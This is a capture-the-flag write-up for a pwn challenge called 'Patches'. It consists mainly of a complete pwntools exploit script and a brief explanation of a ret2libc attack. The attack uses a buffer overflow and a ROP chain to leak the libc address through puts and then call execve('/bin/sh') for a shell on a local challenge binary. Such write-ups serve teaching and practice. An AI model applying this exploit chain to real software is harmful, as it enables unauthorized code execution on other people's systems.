---
type: challenge
event: september
name: Patches
category: pwn
note: ret2libc
solved: ✅
---

```python
#!/usr/bin/python
from pwn import *

context(os='linux',arch='amd64')
context.log_level = 'DEBUG'
context(terminal=['tmux','new-window'])

p = process('./patches')
e = ELF('./patches')
libc = ELF('./libc-2.31.so')

JUNK = b"A"*136

pop_rdi = 0x4012d3
pop_rsi = 0x4012d1

gets = e.plt['gets']
plt_puts = e.plt['puts']
got_puts = e.got['puts']

bss = e.get_section_by_name('.bss')["sh_addr"] + 1200

main = e.symbols['main']

payload = JUNK + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(pop_rsi) + p64(0) + p64(0) + p64(main)

p.recvuntil("> ")
p.sendline(payload)
p.sendline("/bin/sh\x00")

leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.symbols['puts']
print(hex(libc.address))

execve = libc.symbols['execve']

payload = JUNK + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) + p64(0) + p64(execve)  

p.recvuntil("> ")
p.sendline(payload)

p.interactive()
```

Idea: 
- Buffer overflow to overwrite return address by `pop_rdi`
- `pop_rdi` will get the top of the stack (currently `bss`) and return (jump to `gets`).
- Enter `/bin/sh` to write to `bss`.
- Another `pop_rdi` to get `got_puts`, this is the address of libc puts function, thus we can leak libc address.
- Call `plt_puts` to print the libc address.
- `pop_rsi` to reset the second argument and call `main`, we need to 0 because the instruction at that location is `pop rsi` then `pop r15`.
- Now we rerun main function and can run another buffer overflow.